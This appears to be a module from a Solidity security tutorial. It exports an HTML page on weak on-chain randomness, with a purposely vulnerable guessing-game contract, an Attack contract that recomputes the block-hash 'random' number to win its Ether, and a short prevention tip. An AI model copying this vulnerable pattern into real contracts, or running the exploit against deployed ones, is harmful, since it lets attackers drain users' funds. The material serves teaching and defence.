// metadata
export const version = "0.6.0"
export const title = "Source of Randomness"
export const description = "Blockchain is not a reliable source of randomness in Solidity"

const html = `<h3 id="vulnerability">Vulnerability</h3>
<p><code>blockhash</code> and <code>block.timestamp</code> are not reliable sources for randomness.</p>
<pre><code class="language-solidity">pragma solidity ^0.6.0;

/*
NOTE: cannot use blockhash in Remix so use ganache-cli

npm i -g ganache-cli
ganache-cli
In remix switch environment to Web3 provider
*/

/*
GuessTheRandomNumber is a game where you win 1 Ether if you can guess the
pseudo random number generated from block hash and timestamp.

At first glance, it seems impossible to guess the correct number.
But let&#39;s see how easy it is win.

1. Alice deploys GuessTheRandomNumber with 1 Ether
2. Eve deploys Attack
3. Eve calls Attack.attack() and wins 1 Ether

What happened?
Attack computed the correct answer by simply copying the code that computes the random number.
*/

contract GuessTheRandomNumber {
    constructor() public payable {}

    function guess(uint _guess) public {
        uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        )));

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call.value(1 ether)("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
         uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        )));

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}</code></pre>
<h3 id="preventative-techniques">Preventative Techniques</h3>
<ul>
<li>Don&#39;t use <code>blockhash</code> and <code>block.timestamp</code> as source of randomness</li>
</ul>
`

export default html
